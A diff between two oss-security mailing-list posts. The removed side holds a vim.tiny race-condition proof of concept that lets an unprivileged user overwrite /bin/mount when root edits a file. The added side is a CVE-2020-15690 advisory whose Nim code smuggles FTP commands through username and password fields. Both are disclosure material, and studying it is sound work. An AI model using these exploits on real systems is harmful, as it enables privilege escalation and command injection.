@@ -1,9 +1,9 @@
-X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
-	["9212" "Monday" "13" "November" "2017" "15:10:25" "+0000" "Fiedler Roman" "Roman.Fiedler@ait.ac.at" "<2ECE9D9EEF1F524185270138AE23265955B10190@S0MSMAIL112.arc.local>" "174" "AW: [oss-security] Security risk of server side text editing in general and vim.tiny specifically" "^Date:" nil nil "11" "2017111315:10:25" "AW: [oss-security] Security risk of server side text editing in general and vim.tiny specifically" (number mark "        Roman.Fiedle Nov 13  174/9212  " thread-indent "\"AW: [oss-security] Security risk of server side text editing in general and vim.tiny specifically\"\n") "<20171113145336.GA23241@openwall.com>" ("<2ECE9D9EEF1F524185270138AE23265955B0B9CE@S0MSMAIL112.arc.local>" "<20171113145336.GA23241@openwall.com>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["2884" "Thursday" "4" "February" "2021" "15:58:23" "+0100" "Martin Ortner" "martin.ortner@consensys.net" "<F0E1DB22-8CF0-46D2-9E59-C45FF50D2C2C@consensys.net>" "115" "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" nil nil nil "2" "2021020414:58:23" "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" (number mark "U       martin.ortne Feb  4  115/2884  " thread-indent "\"[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection\"\n") nil nil nil nil nil nil nil nil nil "[oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection" nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
 	nil)
-X-Mozilla-Status: 0001
+X-Mozilla-Status: 0000
 X-Mozilla-Status2: 00000000
-Received: (qmail 11280 invoked by uid 550); 13 Nov 2017 15:12:43 -0000
+Received: (qmail 32554 invoked by uid 550); 4 Feb 2021 15:14:23 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -11,201 +11,160 @@ List-Help: <mailto:oss-security-help@lists.openwall.com>
 List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
-Received: (qmail 9501 invoked from network); 13 Nov 2017 15:10:38 -0000
-Thread-Topic: [oss-security] Security risk of server side text editing in
- general and vim.tiny specifically
-Thread-Index: AdNUkOKUbUqTfoP3SaOI50kWgowr+AH9eqAAAAKdVpA=
-Message-ID: <2ECE9D9EEF1F524185270138AE23265955B10190@S0MSMAIL112.arc.local>
-References: <2ECE9D9EEF1F524185270138AE23265955B0B9CE@S0MSMAIL112.arc.local>
- <20171113145336.GA23241@openwall.com>
-In-Reply-To: <20171113145336.GA23241@openwall.com>
-Accept-Language: en-US, de-AT
-Content-Language: de-DE
-X-MS-Has-Attach: yes
-X-MS-TNEF-Correlator: 
-x-originating-ip: [172.30.249.121]
-Content-Type: multipart/signed; micalg=2.16.840.1.101.3.4.2.1;
-	protocol="application/x-pkcs7-signature";
-	boundary="----=_NextPart_000_0029_01D35C99.EA4776A0"
-MIME-Version: 1.0
-Date: Mon, 13 Nov 2017 15:10:25 +0000
-From: Fiedler Roman <Roman.Fiedler@ait.ac.at>
 Reply-To: oss-security@lists.openwall.com
-Subject: AW: [oss-security] Security risk of server side text editing in
- general and vim.tiny specifically
-To: "'oss-security@lists.openwall.com'" <oss-security@lists.openwall.com>
-
-------=_NextPart_000_0029_01D35C99.EA4776A0
+Received: (qmail 25722 invoked from network); 4 Feb 2021 14:58:37 -0000
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=consensys.net; s=google;
+        h=from:content-transfer-encoding:mime-version:subject:message-id:date
+         :to;
+        bh=LC/CtskIU5zUqjnT1WDFqo3Z88ZzuvKuovar+jf9cfM=;
+        b=Y89ag2m3L6srgAjyxwgk09PHAZPAPADdk1UwWmjuh8ObZWN+gxQbuGnkc80RyhqkYj
+         DHbNy63Q6cnBjfKravsf1fo/I2QYQZ6Djl+yB+XE0fFW+DeuipEub/0kYKNNDqnvRcgG
+         cLGjw6lbC1f2pkdhw0jnoKvHw4rZIAe9Z9T4yGPyJVrHkKlYxiZ0NhsRQFvOpWKPpnN5
+         4d1xL5zO0ME/H6tdgqTYBxGvGCkRvMCBhinjrwEgXLbkhiU72lkauzu7cDL6qsFnFXHX
+         g69ZIaGCchBygrVD0nLfyUiRr/bG3N24dZ88YXluRm0qYMRuMxDiZspFl6IQS/hZmCP1
+         PrIA==
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20161025;
+        h=x-gm-message-state:from:content-transfer-encoding:mime-version
+         :subject:message-id:date:to;
+        bh=LC/CtskIU5zUqjnT1WDFqo3Z88ZzuvKuovar+jf9cfM=;
+        b=Q6R4wzHtvQzhHDLVMAcaI6MKIaJ4kUINP0aXLPisjvP3QdoMbm6PK9Wyhn1qE1gI7B
+         SGhe3V1aZaFQydkHobgJ5IZ1BojkNb8dNirc+bSw65WBpAfTEV8V+kBmt1DZI7YSh1Ww
+         zZYV3wng9IsHG+Pvyk4KIshaT61sQ8obwPK6iHbWZLm7RzG/nJ+vfz4D7EGlgQdsEcS8
+         liITRZxeGEXk5BqasIGRugJINvjHgERgjZTYlSjx6qTENMStHzGU8NSN81y1P+tAwFG1
+         B9PIr1LcI033977sL9LYBqJJu4bUKsKVhDT7cdCK7cxwXL7owZqgRi7kF3X42tHl0nOm
+         OiQQ==
+X-Gm-Message-State: AOAM532IlknevVF3qDf5JFsbAWUuMrAGnLPyZ8cACUBeHbX8ZvUm005n
+	Ze+9C94nmJ1hlFjbAua842i1NxB2kysdRGdtPx4R87fIkrjHZG+njx5VQyiHQ1gSg+5U3etGVP3
+	Pfg4dZDmzlBsrLeMATvwF8sqOt4t2D+kUddGWkNx9iDlD7bQOzv7WmRBXXlCqHD8y5c7YCjepP1
+	6duGrF84ACavj7fT8sqtI=
+X-Google-Smtp-Source: ABdhPJw5KKsQ5ArEk+70yRY+/YiSvWR5Ydh8461cMRwF3R+0bO9ln1FyJShxg/knS/sqiYXTvkfmAA==
+X-Received: by 2002:a1c:2092:: with SMTP id g140mr8027172wmg.4.1612450705849;
+        Thu, 04 Feb 2021 06:58:25 -0800 (PST)
+From: Martin Ortner <martin.ortner@consensys.net>
 Content-Type: text/plain;
-	charset="utf-8"
-Content-Transfer-Encoding: 7bit
+	charset=utf-8
+Content-Transfer-Encoding: quoted-printable
+Mime-Version: 1.0 (Mac OS X Mail 13.4 \(3608.120.23.2.4\))
+Message-Id: <F0E1DB22-8CF0-46D2-9E59-C45FF50D2C2C@consensys.net>
+Date: Thu, 4 Feb 2021 15:58:23 +0100
+To: oss-security@lists.openwall.com
+X-Mailer: Apple Mail (2.3608.120.23.2.4)
+Subject: [oss-security] [CVE-2020-15690] Nim - stdlib asyncftpd - Crlf Injection
 
-Hello Alexander,
+title: "Nim - stdlib asyncftpd - Crlf Injection"
+date: 2021-02-04T15:25:49+01:00
 
-> Von: Solar Designer [mailto:solar@openwall.com]
->
-> On Fri, Nov 03, 2017 at 11:07:14AM +0000, Fiedler Roman wrote:
-> > PS: POC for vim.tiny on Ubuntu Xenial to overwrite arbitrary files as user
-> root when editing file in directory owned by other user is available on
-> request, disclosure after one week or if list discussion indicates other 
-> timing.
->
-> Please post this PoC in here ASAP.  Right now, you're in violation of
-> distros list policy for having posted the PoC in there yet not made it
-> public on oss-security within 7 days after posting about the issue
-> itself in here.  Please correct this.  (To me this is also an example of
-> misuse of the distros list, and then of the ability to delay posting the
-> PoC - creating administrative work for all of us out of thin air.)
+cve: ["CVE-2020-15690"]
+vendor: nim-lang
+vendorUrl: https://nim-lang.org/
+authors: tintinweb
+affectedVersions: [ "< 1.2.6" ]
+vulnClass: CWE-93
 
-Thanks for the reminder. here is the text from the original mail to your 
-[vs]-list:
-
-PS: POC for Ubuntu Xenial to overwrite /bin/mount with custom content by
-creating a x.txt as another user (e.g. www-data) and having root edit it using
-vim.tiny. Of course attacker would restore everything to normal afterwards
-(omitted). On multicore machines, the race is not always won, for testing
-purposes you can strace vim (making it slower) or add other machine load, e.g
-" (cat /dev/zero | md5sum) &" as www-data. With strace, chance is nearly 100%
-to replace /bin/mount with x.txt (including mode, ownership). With 24 md5sum
-on a 4 core machine, chance is > 80% to make /bin/mount world writable,
-otherwise also replacing the content, changing ownership.
-
-* Create a rogue file of same size as user www-data: In real world attack,
-attack would pad a file writeable by him to same size as a system library,
-essential binary using spaces or newlines at the end of the file. For demo,
-newlines only will do.
-
-#!/usr/bin/python3 -BEsStt
-
-import os
-
-mountSize = os.stat('/bin/mount').st_size
-targetFileName = 'x.txt'
-targetFile = open(targetFileName, 'wb')
-targetFile.write(b'\n' * mountSize)
-targetFile.close()
-os.chmod(targetFileName, 0o777)
-
-* Use tool from https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=602333 to
-replace with symlink. Start it as www-data after root started "vim.tiny x.txt"
-but before saving file as root.
-
-./DirModifyInotify --Watch x.txt --MovePath x.txt --LinkTarget
-/bin/mount --WatchCount 0
+Vulnerability Note: https://consensys.net/diligence/vulnerabilities/nim-asy=
+ncftpd-crlf-injection/
+Vulnerability Note: https://github.com/tintinweb/pub/tree/master/pocs/cve-2=
+020-15690
+Group: https://consensys.net/diligence/research/
 
 
 
-------=_NextPart_000_0029_01D35C99.EA4776A0
-Content-Type: application/pkcs7-signature; name="smime.p7s"
-Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="smime.p7s"
+# Vulnerability Note
 
-MIAGCSqGSIb3DQEHAqCAMIACAQExDzANBglghkgBZQMEAgEFADCABgkqhkiG
-9w0BBwEAAKCCDL0wggX9MIID5aADAgECAgkAkvp1Fx1x2IMwDQYJKoZIhvcN
-AQELBQAwgawxCzAJBgNVBAYTAkFUMQ8wDQYDVQQIDAZWaWVubmExDzANBgNV
-BAcMBlZpZW5uYTEyMDAGA1UECgwpQUlUIEF1c3RyaWFuIEluc3RpdHV0ZSBv
-ZiBUZWNobm9sb2d5IEdtYkgxLTArBgNVBAsMJENlbnRlciBmb3IgRGlnaXRh
-bCBTYWZldHkgJiBTZWN1cml0eTEYMBYGA1UEAwwPQUlUIERTUyByb290IENB
-MB4XDTE3MDMwOTE1MTI1NloXDTI3MDMxMDE1MTI1NlowgawxCzAJBgNVBAYT
-AkFUMQ8wDQYDVQQIDAZWaWVubmExDzANBgNVBAcMBlZpZW5uYTEyMDAGA1UE
-CgwpQUlUIEF1c3RyaWFuIEluc3RpdHV0ZSBvZiBUZWNobm9sb2d5IEdtYkgx
-LTArBgNVBAsMJENlbnRlciBmb3IgRGlnaXRhbCBTYWZldHkgJiBTZWN1cml0
-eTEYMBYGA1UEAwwPQUlUIERTUyByb290IENBMIICIjANBgkqhkiG9w0BAQEF
-AAOCAg8AMIICCgKCAgEAxGoc+0dcZdumBz9T9+kB4HCojrjmR6k8jkDwW9jn
-X0tLqBuwlfWf7oTBfHRH0phPhShdTs0WRVqEGScWgnf2F8iS85aytRHRnW9r
-jeJH8xOxqFsugZbmOWGhw8kM9iw6GMyPKhfKh0Z6wUS8zAu3ZMj8QA2SZzkx
-iazZA8AjmfOjhkUStD5rYxEQueFSq5zgIN6sdQnTLbiLlRlSklGIgViBen8N
-fy9maZnXnyQSeqv+AJvusw4tq/qPA9fwXSf/4Fo+YgzbcoRpkpZ3GA3eArb6
-38l4uqLZekynVpzPO6fltw1nV0WNj02gw+NckHuHGBMTFWLzGtMx4TSvzXRd
-Ry4bApphNyefO8digyBC1Wzl2mL/w97tpTLMo9RHa1DMRd4CBV2YbdRkHAhR
-dsuAId2CXgFBS26OJjnccfgviqBlAKyDKR30D6DImvjFOS88IQ8uyP6Aedl+
-eQd5+4rCrf4Aclk+idD46d7QkxPJvyCIhLzjeWQU+O1GWEwiy1aKkA9WLF7K
-s88pJ2y7esHciEidwemSrS2ffaToa/K4VqBkmn3ppHjmj6D2gSdQstEhChPK
-xToF/LCQBQc6o0vpH4eUFkHM/aKxBu9sKwZDMIMumNPyox2l/ewa526uuS5O
-joPg83YDnxxDQ1XWrx4yIo+j1FtqROV4sEVFSgJZjV8CAwEAAaMgMB4wDwYD
-VR0TAQH/BAUwAwEB/zALBgNVHQ8EBAMCAQYwDQYJKoZIhvcNAQELBQADggIB
-AHNwDZs17W6Lg4Cxvax++h2WeTLGlnX+l1iybi5cG65rcwDrRdqPv/T7FUzy
-H7c2hLLFuyGZuCXrhrPkmknVYPNOt0SQtbZuf6mSC7HVgdcEwgBRVldfY7qy
-3KLMX6H2zZJF3eWWEWvctHGn1O9BD1I4vvSMD2FwSmy3hQq94/c/Wl2Tj6+Z
-eONFKS4vT2wNIFesBXDJRmKLermIenV7EkiBO5qxnN5Q25+W3WEkrbuiPO5s
-1KSQ1QxL88f+R9MJl8AJEXA2gzOBxKqMabJ/+NGUTt0yy7PJX0QucJ/ESwic
-VQBjMKmfJxRuPkqYRpd9BQ7mp2jNzqmMiXZsdfH7NZ7UKkNevNkA13fV7k3M
-D1oeZhe5MeVObzyB+hO7sb8fiNV5QSR1c3/uyAt3OEs7s1JD7vL8dmHULh5C
-sVHvdr8V7Zjm4wta+7DaLBtz0mhgb9OagLZy5vS6GSKqiuf996epsTAgBFpj
-JMOYYOEOlOzvnF11irl+7YMcHdOaHk+lccqwEe1oDNIjysM9aj8Uu2S9aEf6
-NACA5UB4DG27yptRsXMQwOu10/lQ1Ju5H6Ed4Od5+HoTFJvVfxuelHvggce9
-En1vQ9JTIm10MV1HwdkxQObweGZH4mt/HJkHKPm/X3hJCztmpOugQ50lMitC
-BOk095ufDatc6TWbeie9/nFoMIIGuDCCBKCgAwIBAgIhAPyFSUbhuCR1JHvV
-d3fEehZlFVSMVIrD5sezDgn+++vfMA0GCSqGSIb3DQEBCwUAMIGsMQswCQYD
-VQQGEwJBVDEPMA0GA1UECAwGVmllbm5hMQ8wDQYDVQQHDAZWaWVubmExMjAw
-BgNVBAoMKUFJVCBBdXN0cmlhbiBJbnN0aXR1dGUgb2YgVGVjaG5vbG9neSBH
-bWJIMS0wKwYDVQQLDCRDZW50ZXIgZm9yIERpZ2l0YWwgU2FmZXR5ICYgU2Vj
-dXJpdHkxGDAWBgNVBAMMD0FJVCBEU1Mgcm9vdCBDQTAeFw0xNzA2MDgwODU2
-MDJaFw0yMDA2MDgwODU2MDJaMIHSMQswCQYDVQQGEwJBVDEPMA0GA1UECAwG
-Vmllbm5hMQ8wDQYDVQQHDAZWaWVubmExMjAwBgNVBAoMKUFJVCBBdXN0cmlh
-biBJbnN0aXR1dGUgb2YgVGVjaG5vbG9neSBHbWJIMS0wKwYDVQQLDCRDZW50
-ZXIgZm9yIERpZ2l0YWwgU2FmZXR5ICYgU2VjdXJpdHkxFjAUBgNVBAMMDVJv
-bWFuIEZpZWRsZXIxJjAkBgkqhkiG9w0BCQEWF3JvbWFuLmZpZWRsZXJAYWl0
-LmFjLmF0MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEA2vuUrQTa
-CeYHx0XlnnFZbwNJIAYGtwcX+WNnTOVQpRk9aAImyomxvowzTyfXZVhNjqHw
-sBKN4+Xa7LA0GimyRN6v2eBelrrtJ7ziX+nvGVPlUy/EXgzY/knBX+DD2SCm
-rdMao4U+M3+zk0UhZLn0LnuKKxE9rL78E+8dszLTWh3W9jMYuD3Gx91vFxC5
-JfU8Bv7+4CZ/aMpG1j6ebRdyZhNb5H8O5RERPLszKNcEvc9pAeKxjMI/77kn
-BT92EDxVULD9HLaD/HLWsPP2H6/ELoe/RJ8Yxh2TSICKJGUk95Ryo9qWP+9X
-3zVfiVuwd00O2RX5Z4R9cVFawFRmrxC7yzHoJaHc6rpcw8ca7H9DBC5l4N4B
-wW/JJpdVaIlOKa0HkMZmxZ4rAuQakuvKj7w/6UR+dnoP4Ao5p5uozOfCY8OM
-8OOoh/tnI90Ubil1+niquspba1GiEPDuOzDmLb0le2LzOKf1PSckne2crUtD
-L1PS9lcbFjiiZN93qYPJoqp7QY9tSxF6wyiW9FY14s+TifpEWLjECMn4d4gA
-z+LWo+xG1suBelvPdSCusUFDWRGctewfi8rgOKR3Lb6HSE/1jppsMfNm1xbH
-aCv/y4XvrokA7OY+XdupTvf5SDQVDmilPocTlihqi4czUC7gKsRrP8Rgf3cx
-/xMGQAfoCgwpTY8CAwEAAaOBnDCBmTAMBgNVHRMBAf8EAjAAMA4GA1UdDwEB
-/wQEAwIF4DAdBgNVHSUEFjAUBggrBgEFBQcDAgYIKwYBBQUHAwQwIgYDVR0R
-BBswGYEXcm9tYW4uZmllZGxlckBhaXQuYWMuYXQwNgYDVR0fBC8wLTAroCmg
-J4YlaHR0cDovL2Rzcy5haXQuYWMuYXQvQWl0RHNzUm9vdENhLmNybDANBgkq
-hkiG9w0BAQsFAAOCAgEAlmfH6IKcvELSCvkJN73s+fBUvZsreH+VM4nv6mwO
-G2otjCOimXdoJPIKAdQJMG02miEhSxcnhaCzM7D2NQcI5+Uj4kEsTNXaZ3PT
-p8pClVuVhvUX3xWTRaXypBu7+EYReGXDLrzQHAUS59T1vPTjGWz/uyzZV0T0
-l/h2Nu48JAgUZWqegXtS6A2L0dkyHpLg9v1DWynzSHe/TaiMvLcGhRFX25bv
-QKqmQpOSDJvyDjUzIEBl7ta+pFSCcFvOeJXl9Pyx9Jz1LrKlyHb20gq6BXxR
-dRl1l3h4H+Dxcm+dSh3tgMGxn649Jrr7aESqTgAWgv1JNfTXu0X1TB2ApD3d
-gzvpb6S+VMpzTUPG347m0kMzQ1VsZXbnXMceAd5PGEeCw8mfBY1SCscK87cC
-e4MARvGhKLsbOOn8gti2/iTEyDGTSvKRP1IStFzJdXRApz+tZu9K9vaWx/53
-jV+yhtZCGIXr1XkFp/RYsWap8Ml2q06h0Tgr1fardKPTrVXPs2THDVVN9eV9
-uUJHkqAxnHp8hg5zPVcc6p+Q1ZzxUyG2b4Q1FJ9jSk0upeIIDkv39mUh/q5x
-j35Oe+i3B0Juw3nA3dE7TH6T+XtD8v216UF0XzEiWwtnQxyxd+GQbO+fIzr1
-eyN1QUAY+d2CrAmlfr5zRBstbxx2nqx9xEXlE995gSYxggXPMIIFywIBATCB
-0jCBrDELMAkGA1UEBhMCQVQxDzANBgNVBAgMBlZpZW5uYTEPMA0GA1UEBwwG
-Vmllbm5hMTIwMAYDVQQKDClBSVQgQXVzdHJpYW4gSW5zdGl0dXRlIG9mIFRl
-Y2hub2xvZ3kgR21iSDEtMCsGA1UECwwkQ2VudGVyIGZvciBEaWdpdGFsIFNh
-ZmV0eSAmIFNlY3VyaXR5MRgwFgYDVQQDDA9BSVQgRFNTIHJvb3QgQ0ECIQD8
-hUlG4bgkdSR71Xd3xHoWZRVUjFSKw+bHsw4J/vvr3zANBglghkgBZQMEAgEF
-AKCCAs0wGAYJKoZIhvcNAQkDMQsGCSqGSIb3DQEHATAcBgkqhkiG9w0BCQUx
-DxcNMTcxMTEzMTUxMDI1WjAvBgkqhkiG9w0BCQQxIgQgXBMOTkk3t4lmI3So
-KD8lFmeC6SfmJZB1TBgv/bQGI2gwgZMGCSqGSIb3DQEJDzGBhTCBgjALBglg
-hkgBZQMEASowCwYJYIZIAWUDBAEWMAoGCCqGSIb3DQMHMAsGCWCGSAFlAwQB
-AjAOBggqhkiG9w0DAgICAIAwDQYIKoZIhvcNAwICAUAwCwYJYIZIAWUDBAIB
-MAsGCWCGSAFlAwQCAzALBglghkgBZQMEAgIwBwYFKw4DAhowgeMGCSsGAQQB
-gjcQBDGB1TCB0jCBrDELMAkGA1UEBhMCQVQxDzANBgNVBAgMBlZpZW5uYTEP
-MA0GA1UEBwwGVmllbm5hMTIwMAYDVQQKDClBSVQgQXVzdHJpYW4gSW5zdGl0
-dXRlIG9mIFRlY2hub2xvZ3kgR21iSDEtMCsGA1UECwwkQ2VudGVyIGZvciBE
-aWdpdGFsIFNhZmV0eSAmIFNlY3VyaXR5MRgwFgYDVQQDDA9BSVQgRFNTIHJv
-b3QgQ0ECIQD8hUlG4bgkdSR71Xd3xHoWZRVUjFSKw+bHsw4J/vvr3zCB5QYL
-KoZIhvcNAQkQAgsxgdWggdIwgawxCzAJBgNVBAYTAkFUMQ8wDQYDVQQIDAZW
-aWVubmExDzANBgNVBAcMBlZpZW5uYTEyMDAGA1UECgwpQUlUIEF1c3RyaWFu
-IEluc3RpdHV0ZSBvZiBUZWNobm9sb2d5IEdtYkgxLTArBgNVBAsMJENlbnRl
-ciBmb3IgRGlnaXRhbCBTYWZldHkgJiBTZWN1cml0eTEYMBYGA1UEAwwPQUlU
-IERTUyByb290IENBAiEA/IVJRuG4JHUke9V3d8R6FmUVVIxUisPmx7MOCf77
-698wDQYJKoZIhvcNAQEBBQAEggIAS0iW3A5zBNJ1R5lWx5UdIil1DoS2oVQF
-sKUoklvxZEXSAlWN2NYIlScFoRFBhfOx2Vik9Ot3mXVOdRWqyRQcYYmai3K+
-rcIsdPOSuN9kD+g1XSK1lHQvGbAjHBk95syh+tAOtmXimjYsyS5xF3xaggNc
-YAbQRdDmpRTNf5oBLgKYni2AcU2KTWViHYlP2+lZEFUAdH+0U+bBr7u4ZHXT
-odF8uZ2rJC3C0VnX5cY0b0y4IZWPN67cjdEQFvbDjdGyET5pe2xKJnqgnY4O
-LjGCUQ9u1v4gV+LqCacAtYlRql8D11nypXkZLKRYqo0Dk7xcd0mRpbsYGsQo
-aX8hi+gChGSxxzS7oMyxpufGRKgSSdfZrbCOY+2oopYukdLVgEpQ6c1qBiCd
-8PY3iL6eVE2fB4SBTmt+QVOpsscVC37Eefa2uAb/d0oeZ9j8GTjNynX5VWpm
-wg8G50RZt5aImDWXK8j73QO8O3HAlCUleewPjKyO6JwocueXrlkYplb1x9U/
-/ZdiL1uTCNc9MdCWYT+9cgaGr2Tc6MvljxZrzAeAfHp1na0ni1qypp91ZxQJ
-1YJWbZDe578oAhDL3Xarbto6GmF2GxP+qx3mlKI9roLj8fz+2ZNOkqj80UbA
-e1qXq+OspuZpDVnFsJp17fpn6xCEFuTMrhSf7bQQE5KpoC+1rAsAAAAAAAA=
+## Summary=20
 
-------=_NextPart_000_0029_01D35C99.EA4776A0--
+In Nim before 1.2.6, the standard library asyncftpclient lacks a check for =
+whether a message contains a newline character.
+
+## Details
+
+### Description
+
+The nim standard library `asyncftpclient` is vulnerable to multiple `CR-LF`=
+ injections. An injection is possible if the attacker controls any argument=
+ that is passed to the remote server such as the `username` and `password` =
+to `newAsyncFtpClient`.=20
+
+
+The root cause of this issue is that the `send(ftp, msg)` allows `msg` to c=
+ontain `CR-LF` control characters. An attacker that controls any unchecked =
+input to `send()` can therefore inject arbitrary FTP commands.=20
+
+```nim
+proc send*(ftp: AsyncFtpClient, m: string): Future[TaintedString] {.async.}=
+ =3D
+  ## Send a message to the server, and wait for a primary reply.
+  ## ``\c\L`` is added for you.
+  ##
+  ## **Note:** The server may return multiple lines of coded replies.
+  await ftp.csock.send(m & "\c\L")
+  return await ftp.expectReply()
+```
+
+
+### Proof of Concept
+
+Note: `nim c -r -d:ssl  crlf_inject.nim`
+
+* Injecting FTP commands via `user` and `pass`
+
+```nim
+import asyncdispatch, asyncftpclient
+proc main() {.async.} =3D
+  var ftp =3D newAsyncFtpClient("localhost", user =3D "test\nINJECTED_LINE =
+test test", pass =3D "test\nINJECTED_LINE test test 2")
+  await ftp.connect()
+  echo("Connected")
+waitFor(main())
+```
+
+Output:
+
+```
+=E2=87=92 nim c -r -d:ssl  crlf_inject.nim
+...
+Hint: 104717 LOC; 1.030 sec; 113.309MiB peakmem; Debug build; proj: /Users/=
+tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject.nim; out: /User=
+s/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject [SuccessX]
+Hint: /Users/tintin/workspace/nim/test/issues/asyncftpclient/crlf_inject  [=
+Exec]
+Connected
+```
+
+
+```
+=E2=87=92  nc -l 21
+220 fake ftp
+USER test
+INJECTED_LINE test test
+230 Hi test, thanks for injecting a line...
+PASS test
+INJECTED_LINE test test 2
+230 thx for injecting another line...
+```
+
+### Proposed Fix
+
+- properly validate user input
+- raise an exception if `CR` or `LF` if found in the `msg` passed to `send(=
+)`=20
+
+## Vendor Response
+
+Vendor response: fixed in 1.2.6
+
+### Timeline
+
+```
+JUL/13/2020 - contact dom96//AT//telegram; provided details, PoC
+FEB/04/2020 - public disclosure
+```
+
+## References
+
+* [1] https://nim-lang.org/
+* [2] https://nim-lang.org/install.html
+* [3] https://en.wikipedia.org/wiki/Nim_(programming_language)
+
